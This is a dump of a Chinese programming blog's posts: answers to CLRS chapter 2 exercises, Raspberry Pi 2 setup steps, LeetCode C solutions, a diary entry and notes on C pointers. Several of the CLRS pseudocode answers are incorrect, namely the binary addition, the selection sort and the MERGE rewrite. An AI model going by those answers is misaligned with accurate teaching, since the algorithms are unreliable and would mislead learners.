<h4 id="2-1-4"><a href="#2-1-4" class="headerlink" title="2.1-4"></a>2.1-4</h4><p>Consider the problem of adding two n-bit binary integers, stored in two n-element arrays A and B. The sum of the two integers should be stored in binary form in an (n + 1)-element array C . State the problem formally and write pseudocode for adding the two integers.</p>
<pre class=" language-python"><code class="language-python">SUM<span class="token punctuation">(</span>A<span class="token punctuation">,</span> B<span class="token punctuation">,</span> C<span class="token punctuation">)</span>
<span class="token operator">//</span> 此处假设C元素全部初始化为<span class="token number">0</span>
<span class="token keyword">for</span> i <span class="token operator">=</span> n to <span class="token number">1</span>
    C<span class="token punctuation">[</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> A<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> B<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
    <span class="token keyword">if</span> C<span class="token punctuation">[</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">2</span>
        C<span class="token punctuation">[</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> C<span class="token punctuation">[</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">2</span>
        C<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> C<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span>
</code></pre>
<h4 id="2-2-1"><a href="#2-2-1" class="headerlink" title="2.2-1"></a>2.2-1</h4><p>Express the function <img src="http://www.zhihu.com/equation?tex=n%5E3" alt="">/1000 - 100<img src="http://www.zhihu.com/equation?tex=n%5E2" alt=""> - 1000n + 3 in terms of Θ-notation.</p>
<p>Θ(<img src="http://www.zhihu.com/equation?tex=n%5E3" alt="">)</p>
<h4 id="2-2-2"><a href="#2-2-2" class="headerlink" title="2.2-2"></a>2.2-2</h4><p>Consider sorting n numbers stored in array A by first finding the smallest element of A and exchanging it with the element in A[1]. Then find the second smallest element of A, and exchange it with A[2]. Continue in this manner for the first n - 1 elements of A. Write pseudocode for this algorithm, which is known as <em>selection sort</em>. What loop invariant does this algorithm maintain? Why does it need to run for only the first n - 1 elements, rather than for all n elements? Give the best-case and worst-case running times of selection sort in Θ-notation.</p>
<pre class=" language-python"><code class="language-python">SELECTION<span class="token operator">-</span>SORT<span class="token punctuation">(</span>A<span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token operator">=</span> <span class="token number">1</span> to n <span class="token operator">-</span> <span class="token number">1</span>
    key <span class="token operator">=</span> A<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
    index <span class="token operator">=</span> i
    <span class="token keyword">for</span> j <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span> to n
        <span class="token keyword">if</span> A<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> key
            key <span class="token operator">=</span> A<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
            index <span class="token operator">=</span> j
    A<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> A<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
    A<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> key
</code></pre>
<p>循环不变式就不写了<br>最好最坏情况都是Θ(<img src="http://www.zhihu.com/equation?tex=n%5E2" alt="">)</p>
<h4 id="2-2-3"><a href="#2-2-3" class="headerlink" title="2.2-3"></a>2.2-3</h4><p>Consider linear search again (see Exercise 2.1-3). How many elements of the in- put sequence need to be checked on the average, assuming that the element being searched for is equally likely to be any element in the array? How about in the worst case? What are the average-case and worst-case running times of linear search in Θ-notation? Justify your answers.</p>
<p>最坏的情况为n,平均和最坏情况运行时间都为Θ(n).</p>
<h4 id="2-2-4"><a href="#2-2-4" class="headerlink" title="2.2-4"></a>2.2-4</h4><p>How can we modify almost any algorithm to have a good best-case running time?</p>
<p>分析问题，运用数学知识不断推导得出最优解？这题。。。</p>
<h4 id="2-3-1"><a href="#2-3-1" class="headerlink" title="2.3-1"></a>2.3-1</h4><p>Using Figure 2.4 as a model, illustrate the operation of merge sort on the array A = <3, 49="" 41,="" 52,="" 26,="" 38,="" 57,="" 9,="">. </3,></p>
<p><img src="CLRS-1.2.png" alt=""></p>
<h4 id="2-3-2"><a href="#2-3-2" class="headerlink" title="2.3-2"></a>2.3-2</h4><p>Rewrite the MERGE procedure so that it does not use sentinels, instead stopping once either array L or R has had all its elements copied back to A and then copying the remainder of the other array back into A.</p>
<pre class=" language-python"><code class="language-python"><span class="token operator">//</span> 已知LR已排序
n1 <span class="token operator">=</span> q <span class="token operator">-</span> p <span class="token operator">+</span> <span class="token number">1</span>
n2 <span class="token operator">=</span> r <span class="token operator">-</span> p

MERGE<span class="token punctuation">(</span>A<span class="token punctuation">,</span>p<span class="token punctuation">,</span>q<span class="token punctuation">,</span>r<span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token operator">=</span> <span class="token number">1</span> to n1
        L<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> A<span class="token punctuation">[</span>p <span class="token operator">+</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> j <span class="token operator">=</span> <span class="token number">1</span> to A<span class="token punctuation">[</span>q <span class="token operator">+</span> j<span class="token punctuation">]</span>
        R<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> A<span class="token punctuation">[</span>q<span class="token operator">+</span>j<span class="token punctuation">]</span>

    <span class="token keyword">for</span> k <span class="token operator">=</span> p to r
         <span class="token keyword">if</span> i <span class="token operator">&lt;</span> n1 <span class="token operator">and</span> j <span class="token operator">&lt;</span> n2
             <span class="token keyword">if</span> L<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> R<span class="token punctuation">[</span>j<span class="token punctuation">]</span>
                 A<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> L<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
                 i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>
                 <span class="token keyword">continue</span>
            <span class="token keyword">else</span> A<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> R<span class="token punctuation">[</span>j<span class="token punctuation">]</span>
                j <span class="token operator">=</span> j <span class="token operator">+</span> <span class="token number">1</span>
                <span class="token keyword">continue</span>

        <span class="token keyword">if</span> i <span class="token operator">></span> <span class="token operator">=</span>n1 <span class="token operator">and</span> j <span class="token operator">&lt;</span> n2<span class="token punctuation">:</span>
            A<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> R<span class="token punctuation">[</span>j<span class="token punctuation">]</span>
            j <span class="token operator">=</span> j <span class="token operator">+</span> <span class="token number">1</span>
            <span class="token keyword">continue</span>
        <span class="token keyword">if</span> i <span class="token operator">&lt;</span> n1 <span class="token operator">and</span> j <span class="token operator">></span> n2
            A<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> L<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
            i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>
            <span class="token keyword">continue</span>
</code></pre>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Raspberry Pi 2 上手]]></title>
      <url>http://xinqiu.me/2015/07/26/Raspberry-Pi-2/</url>
      <content type="html"><![CDATA[<blockquote>
<p>家里的1代内存小，性能渣，所以入了新的2代。</p>
</blockquote>
<a id="more"></a>
<!--toc-->
<h2 id="u5B89_u88C5"><a href="#u5B89_u88C5" class="headerlink" title="安装"></a>安装</h2><h3 id="u4E0B_u8F7DOS"><a href="#u4E0B_u8F7DOS" class="headerlink" title="下载OS"></a>下载OS</h3><p>这里我使用的是<code>RASPBIAN</code>(2015-05-05).下载地址:<a href="http://www.raspberrypi.org/downloads" target="_blank" rel="external">http://www.raspberrypi.org/downloads</a> </p>
<h3 id="SD_u5361"><a href="#SD_u5361" class="headerlink" title="SD卡"></a>SD卡</h3><p>这代用的是Micro SD，不知道会不会读写速度没SD卡好。<br>I<br>使用<code>SD Formatter</code>对卡进行格式化。格式化好后用<code>Win32 Disk Imager</code>将镜像拷入。一切准备OK后就可以接上电源开机了。</p>
<h3 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h3><p>首次启动会出现Raspi-config，当然之后也可以使用<code>sudo raspi-config</code>来更改系统设置。<br>第一件事是进入<code>8 Advanced Options</code>-&gt;<code>A4 SSH</code>,选择<code>Enable</code>.这样之后就可以直接在终端里用SSH连接树莓派了。</p>
<h3 id="u65E0_u7EBF_u7F51_u5361"><a href="#u65E0_u7EBF_u7F51_u5361" class="headerlink" title="无线网卡"></a>无线网卡</h3><p>识别网卡后，要修改网络配置文件。修改<code>/etc/network/interfaces</code>文件。</p>
<p>使用命令</p>
<pre class=" language-bash"><code class="language-bash"><span class="token function">vi</span> /etc/network/interfaces
</code></pre>
<h2 id="u4E00_u4E9B_u5DE5_u5177"><a href="#u4E00_u4E9B_u5DE5_u5177" class="headerlink" title="一些工具"></a>一些工具</h2><h3 id="u770B_u95E8_u72D7"><a href="#u770B_u95E8_u72D7" class="headerlink" title="看门狗"></a>看门狗</h3><p>树莓派的CPU是保护有硬件看门狗的，可以通过安装模块和值守程序来实现看门狗防止树莓派死机。</p>
<h4 id="u5B89_u88C5_u65B9_u6CD5"><a href="#u5B89_u88C5_u65B9_u6CD5" class="headerlink" title="安装方法"></a>安装方法</h4><p>1.加载看门狗模块，编辑/etc/modules文件，添加一行“bcm2708_wdog”</p>
<pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> modprobe bcm2708_wdog
<span class="token function">sudo</span> vim /etc/modules
</code></pre>
<p>添加一行”bcm2708_wdog”</p>
<p>2.安装系统配置软件和看门狗程序</p>
<pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token function">chkconfig</span> watchdog
</code></pre>
<p>3.配置看门狗程序，编辑“/etc/watchdog.conf”文件</p>
<pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> vim /etc/watchdog.conf
</code></pre>
<p>去掉 watchdog-device = /dev/watchdog 前的#号，让看门狗设备对应树莓派的硬件看门狗<br>去掉 max-load-1 = 24 前的#号，当1分钟load进程超过24个的时候就会重启</p>
<p>还可以设置高温复位：<br>去掉</p>
<pre class=" language-bash"><code class="language-bash">temperature-device <span class="token operator">=</span>
max-temperature <span class="token operator">=</span> 120
</code></pre>
<p>前的#号，改为</p>
<pre class=" language-bash"><code class="language-bash">temperature-device <span class="token operator">=</span> /sys/class/thermal/thermal_zone0/temp
max-temperature <span class="token operator">=</span> 80000
</code></pre>
<p>温度超过80度就会引起重启，保护CPU。<br>配置完后，保存退出。</p>
<p>4.配置看门狗程序，开机自动运行</p>
<pre class=" language-bash"><code class="language-bash"><span class="token function">chkconfig</span> watchdog on
</code></pre>
<p>5.启动看门狗</p>
<pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> /etc/init.d/watchdog start
</code></pre>
<h3 id="vsftpd"><a href="#vsftpd" class="headerlink" title="vsftpd"></a>vsftpd</h3><p>1,安装vsftpd服务器 (约400KB)</p>
<pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> vsftpd
</code></pre>
<p>2,启动ftp服务</p>
<pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">service</span> vsftpd start
</code></pre>
<p>3,编辑vsftdp的配置文件</p>
<pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> vim /etc/vsftpd.conf
</code></pre>
<p>找到以下行，定义一下</p>
<p>anonymous_enable=NO  </p>
<p>表示：不允许匿名访问</p>
<p>local_enable=YES   </p>
<p>设定本地用户可以访问。</p>
<p>write_enable=YES</p>
<p>设定可以进行写操作</p>
<p>local_umask=022</p>
<p>设定上传后文件的权限掩码。</p>
<p>存盘退出</p>
<p>4, 重启vsftpd服务</p>
<pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">service</span> vsftpd restart
</code></pre>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[LeetCode - Convert Sorted Array to Binary Search Tree]]></title>
      <url>http://xinqiu.me/2015/07/18/LeetCode-108/</url>
      <content type="html"><![CDATA[<blockquote>
<p>Given an array where elements are sorted in ascending order, convert it to a height balanced BST.</p>
</blockquote>
<p>这道题思路有点像二分查找。</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/**
 * Definition for a binary tree node.
 * struct TreeNode {
 *     int val;
 *     struct TreeNode *left;
 *     struct TreeNode *right;
 * };
 */</span>
<span class="token keyword">struct</span> TreeNode<span class="token operator">*</span> <span class="token function">sortedArrayToBST</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> numsSize<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>numsSize <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    <span class="token keyword">struct</span> TreeNode <span class="token operator">*</span>Root <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> TreeNode<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> TreeNode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    Root<span class="token operator">-></span>val <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>nums <span class="token operator">+</span> numsSize <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    Root<span class="token operator">-></span>left <span class="token operator">=</span> <span class="token function">sortedArrayToBST</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> numsSize <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    Root<span class="token operator">-></span>right <span class="token operator">=</span> <span class="token function">sortedArrayToBST</span><span class="token punctuation">(</span>nums <span class="token operator">+</span> numsSize <span class="token operator">/</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> numsSize<span class="token operator">-</span>numsSize<span class="token operator">/</span><span class="token number">2</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> Root<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[想有一个不一样的暑假]]></title>
      <url>http://xinqiu.me/2015/07/09/Dairy-3/</url>
      <content type="html"><![CDATA[<p>今年的高考，却已与我无关。直到7、8、9过后，才意识到一年是如此的快。说起来，这一年，在风吹日晒中，磨去了一些锐气和年少轻狂，沉淀了些特立独行的沉默。曾经的豪言壮语，如今想想有点可笑，又有点想哭，毕竟自己选择的路，跪着也要走完。我也有想过为什么我要选择孤独的一个人坚持在敲代码的路上，谁都知道吃喝玩乐才是大学正道。正是因为一路上失去了太多，才会更加珍惜现在的所得；正是因为经历了这些，才能学会沉淀，才能变得不在患得患失，不再无理取闹。前年的选择还是正确的，至少如今的我，没有在一个更堕落的地方。</p>
<p>这一年，从当初的懵懂，到轻狂，到迷茫，到沉默，到质疑。走过了些弯路，惹过一些是非，折腾了一些自己。但是直到如今，我似乎还没有真正找到应该走的那条路。</p>
<p>我觉得大一的暑假过后，就决定了大学四年会是怎样。我觉得应该出去走走，趁算得上是青春里最后一个可以自由挥洒的暑假，出去看看，看看外面的世界，而不是窝在小小的屋檐下。</p>
<p>想做些不一样的事。这篇随笔可以会一直更新，更新些暑假里发生的事，直到暑假结束。</p>
<p>我尝试开始做开源翻译，因为是刚开始，选择了比较简单的Gitbook上的Learn Javascript开始翻译，同时也正好可以学习JS。欢迎来纠错[<a href="https://www.gitbook.com/book/xinqiu/learn-javascript-cn/details" target="_blank" rel="external">Click</a>]。还参与《Pro Git》第二版的审校。<br>只有真正参与了翻译，才意识到翻译的难。</p>
<p>第二件大事，会是什么呢？</p>
<p>(To be continued)</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[LeetCode - Same Tree]]></title>
      <url>http://xinqiu.me/2015/07/07/LeetCode-100/</url>
      <content type="html"><![CDATA[<blockquote>
<p>Given two binary trees, write a function to check if they are equal or not.</p>
<p>Two binary trees are considered equal if they are structurally identical and the nodes have the same value.</p>
</blockquote>
<pre class=" language-c"><code class="language-c">
<span class="token comment" spellcheck="true">/**
 * Definition for a binary tree node.
 * struct TreeNode {
 *     int val;
 *     struct TreeNode *left;
 *     struct TreeNode *right;
 * };
 */</span>
bool <span class="token function">isSameTree</span><span class="token punctuation">(</span><span class="token keyword">struct</span> TreeNode<span class="token operator">*</span> p<span class="token punctuation">,</span> <span class="token keyword">struct</span> TreeNode<span class="token operator">*</span> q<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>p <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> q <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> 
        <span class="token keyword">return</span> true<span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>p <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> q <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token punctuation">(</span>p <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> q <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> false<span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token operator">-></span>val <span class="token operator">!=</span> q<span class="token operator">-></span>val<span class="token punctuation">)</span>
        <span class="token keyword">return</span> false<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">isSameTree</span><span class="token punctuation">(</span>p<span class="token operator">-></span>left<span class="token punctuation">,</span>q<span class="token operator">-></span>left<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isSameTree</span><span class="token punctuation">(</span>p<span class="token operator">-></span>right<span class="token punctuation">,</span>q<span class="token operator">-></span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[<<深入理解C指针>>读书笔记]]></title>
      <url>http://xinqiu.me/2015/06/09/C-Pointers/</url>
      <content type="html"><![CDATA[<blockquote>
<p>指针可以说是C的灵魂，C语言入门很容易，但想精通，就必须要对指针有很透彻的理解。大一上学期学了一遍C语言，然而指针这个最重要的地方，却没有好好的深入研究。这本&lt;&lt;深入理解C指针&gt;&gt;虽然谈不上讲到多少指针的奇巧淫技，但作为复习指针的相关知识，还是可以稍微读读。</p>
</blockquote>
<a id="more"></a>
<h2 id="u9605_u8BFB_u58F0_u660E"><a href="#u9605_u8BFB_u58F0_u660E" class="headerlink" title="阅读声明"></a>阅读声明</h2><p>倒过来读会让指针更容易理解。<br>￼￼￼<br>例如：</p>
<pre><code>const int *pci;
</code></pre><hr>
<table>
<thead>
<tr>
<th>Explanation</th>
<th style="text-align:center">Declaration</th>
</tr>
</thead>
<tbody>
<tr>
<td>1.pci is a variable</td>
<td style="text-align:center">const int *<strong>pci</strong></td>
</tr>
<tr>
<td>2.pci is a pointer variable</td>
<td style="text-align:center">const int <strong> *pci</strong></td>
</tr>
<tr>
<td>3.pci is a pointer variable to an integer</td>
<td style="text-align:center">const <strong> int *pci</strong></td>
</tr>
<tr>
<td>4.pci is a pointer variable to a constant integer</td>
<td style="text-align:center"><strong>const int *pci </strong></td>
</tr>
</tbody>
</table>
<hr>
<h2 id="u5E38_u91CF_u4E0E_u6307_u9488"><a href="#u5E38_u91CF_u4E0E_u6307_u9488" class="headerlink" title="常量与指针"></a>常量与指针</h2><p>和&lt;<c专家编程>&gt;一样，&lt;&lt;深入理解C指针&gt;&gt;也讲到了常量与指针。</c专家编程></p>
<h3 id="u6307_u5411_u5E38_u91CF_u7684_u6307_u9488"><a href="#u6307_u5411_u5E38_u91CF_u7684_u6307_u9488" class="headerlink" title="指向常量的指针"></a>指向常量的指针</h3><p>指针定义为指向常量，不能通过指针修改它所引用的值。</p>
<pre><code>const int *ptr;
int const *ptr;
</code></pre><h3 id="u6307_u5411_u975E_u5E38_u91CF_u7684_u5E38_u91CF_u6307_u9488"><a href="#u6307_u5411_u975E_u5E38_u91CF_u7684_u5E38_u91CF_u6307_u9488" class="headerlink" title="指向非常量的常量指针"></a>指向非常量的常量指针</h3><p>指针不可变，但所指向的数据可变。指针必须被初始化为指向非常量变量。</p>
<pre><code>int *const ptr;
</code></pre><h3 id="u6307_u5411_u5E38_u91CF_u7684_u5E38_u91CF_u6307_u9488"><a href="#u6307_u5411_u5E38_u91CF_u7684_u5E38_u91CF_u6307_u9488" class="headerlink" title="指向常量的常量指针"></a>指向常量的常量指针</h3><p>指针本身不能修改，指向的数据也不能通过它来修改。</p>
<pre><code>const int *const ptr;
</code></pre><h3 id="u6307_u5411_u300E_u6307_u5411_u5E38_u91CF_u7684_u5E38_u91CF_u6307_u9488_u300F_u7684_u6307_u9488"><a href="#u6307_u5411_u300E_u6307_u5411_u5E38_u91CF_u7684_u5E38_u91CF_u6307_u9488_u300F_u7684_u6307_u9488" class="headerlink" title="指向『指向常量的常量指针』的指针"></a>指向『指向常量的常量指针』的指针</h3><pre><code>const int * const * ptr;
</code></pre><h2 id="u52A8_u6001_u5185_u5B58_u5206_u914D"><a href="#u52A8_u6001_u5185_u5B58_u5206_u914D" class="headerlink" title="动态内存分配"></a>动态内存分配</h2><ul>
<li>malloc</li>
<li>realloc</li>
<li>calloc</li>
</ul>
<hr>
<table>
<thead>
<tr>
<th>Function</th>
<th style="text-align:center">Declaration</th>
</tr>
</thead>
<tbody>
<tr>
<td>malloc</td>
<td style="text-align:center">从堆上分配内存</td>
</tr>
<tr>
<td>realloc</td>
<td style="text-align:center">在之前分配的内存块基础上，将内存重新分配为更大或者更小的部分</td>
</tr>
<tr>
<td>calloc</td>
<td style="text-align:center">从堆上分配内存并清零</td>
</tr>
</tbody>
</table>
<hr>
<h3 id="u53D8_u957F_u6570_u7EC4"><a href="#u53D8_u957F_u6570_u7EC4" class="headerlink" title="变长数组"></a>变长数组</h3><p>使用alloca函数(微软为malloca)在函数的栈帧上分配内存。函数返回后自动释放内存。</p>
<h4 id="u6808_u5E27"><a href="#u6808_u5E27" class="headerlink" title="栈帧"></a>栈帧</h4><p>栈帧由以下几种元素组成</p>
<ul>
<li>返回地址</li>
<li>局部数据存储</li>
<li>参数存储</li>
<li>栈指针和基指针</li>
</ul>
<h2 id="u52A8_u6001_u5206_u914D_u4E8C_u7EF4_u6570_u7EC4"><a href="#u52A8_u6001_u5206_u914D_u4E8C_u7EF4_u6570_u7EC4" class="headerlink" title="动态分配二维数组"></a>动态分配二维数组</h2><h3 id="u52A8_u6001_u5206_u914D_u53EF_u80FD_u4E0D_u8FDE_u7EED_u7684_u5185_u5B58"><a href="#u52A8_u6001_u5206_u914D_u53EF_u80FD_u4E0D_u8FDE_u7EED_u7684_u5185_u5B58" class="headerlink" title="动态分配可能不连续的内存"></a>动态分配可能不连续的内存</h3><p>以下代码演示了如何创建一个内存可能不连续的二维数组。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> rows <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> columns <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token operator">*</span><span class="token operator">*</span>matrix <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span>rows <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> rows<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span>columns <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre>
<h3 id="u52A8_u6001_u5206_u914D_u8FDE_u7EED_u5185_u5B58"><a href="#u52A8_u6001_u5206_u914D_u8FDE_u7EED_u5185_u5B58" class="headerlink" title="动态分配连续内存"></a>动态分配连续内存</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> rows <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> columns <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token operator">*</span><span class="token operator">*</span>matrix <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span>rows <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
matrix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span>rows <span class="token operator">*</span> columns <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> rows<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> matrix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> i <span class="token operator">*</span> columns<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>以上代码演示了第一种技术，第一个malloc分配了一个整数指针数组，一个元素用来存储一行的指针。第二个malloc在存储每行第一个元素的地址。</p>
<p>第二种技术是一次性分配数组所需的所有内存。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token operator">*</span>matrix <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span>rows <span class="token operator">*</span> columns <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<h2 id="u7ED3_u6784_u4F53_u5185_u5B58_u5927_u5C0F"><a href="#u7ED3_u6784_u4F53_u5185_u5B58_u5927_u5C0F" class="headerlink" title="结构体内存大小"></a>结构体内存大小</h2><p>为结构体分配内存时，分配的内存至少是各个字段的长度和。实际长度通常大于这个和。某些数据类型需要对齐到特定边界。比如说，短整数通常对齐到能被2整除的地址上，而整数对齐到能被4整除的地址上。</p>
<h2 id="u907F_u514Dmalloc/free_u5F00_u9500"><a href="#u907F_u514Dmalloc/free_u5F00_u9500" class="headerlink" title="避免malloc/free开销"></a>避免malloc/free开销</h2><p>重复分配然后释放结构体会尝试一些开销，可能导致巨大的性能瓶颈。解决这问题的一种办法是为分配的结构体单独维护一个表。当用户不再需要某个结构体实例时，将其返回结构体池中。当需要某个实例，则从结构体池中获取一个对象。如果没有可用的元素，就动态分配一个实例。但表的长度则成为了一个问题。但这个问题是可以解决。</p>
<h2 id="u5904_u7406_u672A_u521D_u59CB_u5316_u6307_u9488"><a href="#u5904_u7406_u672A_u521D_u59CB_u5316_u6307_u9488" class="headerlink" title="处理未初始化指针"></a>处理未初始化指针</h2><p>有三种方法可以用来处理未初始化的指针:</p>
<ul>
<li>总是用NULL来初始化指针</li>
<li>用assert函数</li>
<li>用第三方工具</li>
</ul>
<p>assert函数判断表达式是否为真，表达式为假，程序会终止。</p>
